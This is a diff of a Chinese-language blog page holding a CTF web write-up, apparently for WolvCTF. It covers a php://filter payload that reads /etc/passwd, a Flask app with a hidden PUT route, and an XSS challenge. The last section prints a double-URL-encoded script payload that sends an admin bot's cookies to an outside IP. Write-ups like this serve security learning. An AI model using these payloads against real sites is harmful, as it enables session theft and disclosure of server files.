@@ -26,11 +26,15 @@
 <meta property="og:site_name" content="My0n9s&#39;blog">
 <meta property="og:description" content="前言不知道是个啥比赛，记录一下">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s41.ax1x.com/2026/01/19/pZ6E3a8.png">
+<meta property="og:image" content="https://s41.ax1x.com/2026/01/19/pZ6EyiF.png">
+<meta property="og:image" content="https://s41.ax1x.com/2026/01/19/pZ6EXLt.png">
 <meta property="article:published_time" content="2026-01-15T05:25:31.000Z">
-<meta property="article:modified_time" content="2026-01-19T01:45:58.199Z">
+<meta property="article:modified_time" content="2026-01-19T10:27:12.472Z">
 <meta property="article:author" content="My0n9s">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s41.ax1x.com/2026/01/19/pZ6E3a8.png">
 
 
 <link rel="canonical" href="http://example.com/2026/01/15/Wolv2023/">
@@ -112,7 +116,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#filter-madness"><span class="nav-number">1.1.</span> <span class="nav-text">filter-madness</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#filter-madness"><span class="nav-number">1.1.</span> <span class="nav-text">filter-madness</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#charlottesweb"><span class="nav-number">1.2.</span> <span class="nav-text">charlottesweb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#zombie-101"><span class="nav-number">1.3.</span> <span class="nav-text">zombie-101</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -127,7 +131,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">102</span>
+          <span class="site-state-item-count">105</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -138,7 +142,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-count">32</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -201,7 +205,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-01-19 09:45:58" itemprop="dateModified" datetime="2026-01-19T09:45:58+08:00">2026-01-19</time>
+      <time title="Modified: 2026-01-19 18:27:12" itemprop="dateModified" datetime="2026-01-19T18:27:12+08:00">2026-01-19</time>
     </span>
 
   
@@ -223,6 +227,25 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Can you submit some madness that will return the flag?</span><br><span class="line"></span><br><span class="line">Your filter madness: php://filter/convert.base64-encode/resource=/etc/passwd</span><br><span class="line">Your filter madness length: 55</span><br><span class="line">Your filter madness results: cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2Jpb</span><br></pre></td></tr></table></figure>
 
 <p>咋一看考察的是<code>php://filer</code>协议，但是这里的resource访问的资源被写死成&#x2F;etc&#x2F;passwd了。经过测试 <code>/</code> 啥的也被ban了，试了很多方式都行不通，但是这里给了一个info，点进去发现是个phpinfo，尝试全局搜索了一下flag，还真有？？？不知道考点是啥。</p>
+<h2 id="charlottesweb"><a href="#charlottesweb" class="headerlink" title="charlottesweb"></a>charlottesweb</h2><p>F12可以看到提示<code>&lt;!--/src--&gt;</code></p>
+<p>访问src可以看到源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">  <span class="keyword">return</span> flask.send_file(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/src&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">  <span class="keyword">return</span> flask.send_file(<span class="string">&#x27;app.py&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/super-secret-route-nobody-will-guess&#x27;</span>, methods=[<span class="string">&#x27;PUT&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p>逻辑很简单，put方法访问一下<code>/super-secret-route-nobody-will-guess</code>即可。</p>
+<h2 id="zombie-101"><a href="#zombie-101" class="headerlink" title="zombie-101"></a>zombie-101</h2><p>考点是xss打cookie，想到了是xss打cookie，但是最后没有利用成功，这里编码有点意思。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.232.142.230:11521/visit?url=http%3A%2F%2F49.232.142.230%3A12623%2Fzombie%3Fshow%3D%253Cscript%253Ewindow.location%253D&#x27;http%253A%252F%252F220.203.23.131%253A8010%252F%253Fcookie%253D&#x27;%252Bbtoa(JSON.stringify(document.cookie))%253B%253C%252Fscript%253E</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/pZ6E3a8"><img src="https://s41.ax1x.com/2026/01/19/pZ6E3a8.png" alt="pZ6E3a8.png"></a></p>
+<p>show那里存在XSS，底下check那里给了url，说是visit访问，所以很容易想到利用管理员的身份去访问拿cookie</p>
+<p>但是这里有个小问题，我直接输入我的服务器vps会得到：</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/pZ6EyiF"><img src="https://s41.ax1x.com/2026/01/19/pZ6EyiF.png" alt="pZ6EyiF.png"></a></p>
+<p><code>hostname</code>需要为<code>49.232.142.230</code>，所以这里涉及到嵌套。</p>
+<p>利用到的poc:<code>?url=http://49.232.142.230:12623/zombie?show=&lt;script&gt;window.location=&#39;http://220.203.23.131:8010/?cookie=&#39;+btoa(JSON.stringify(document.cookie));&lt;/script&gt;</code></p>
+<p>这里有个细节需要注意，前面的部分url编码一次，从<code>show=</code>开始需要编码两次。所以最终的poc:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.232.142.230:12623/visit?url=http%3A%2F%2F49.232.142.230%3A12623%2Fzombie%3Fshow%3D%253Cscript%253Ewindow.location%253D&#x27;http%253A%252F%252F220.203.23.131%253A8010%252F%253Fcookie%253D&#x27;%252Bbtoa(JSON.stringify(document.cookie))%253B%253C%252Fscript%253E</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/pZ6EXLt"><img src="https://s41.ax1x.com/2026/01/19/pZ6EXLt.png" alt="pZ6EXLt.png"></a></p>
+<p><code>base64</code>解码一下即可。</p>
 
     </div>
 
@@ -244,6 +267,9 @@
                 </a>
             </div>
             <div class="post-nav-item">
+                <a href="/2026/01/21/tomcat%E5%BA%95%E5%B1%82%E6%9C%BA%E5%88%B6-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0Servlet/" rel="next" title="tomcat底层机制/手动实现Servlet">
+                  tomcat底层机制/手动实现Servlet <i class="fa fa-angle-right"></i>
+                </a>
             </div>
           </div>
     </footer>
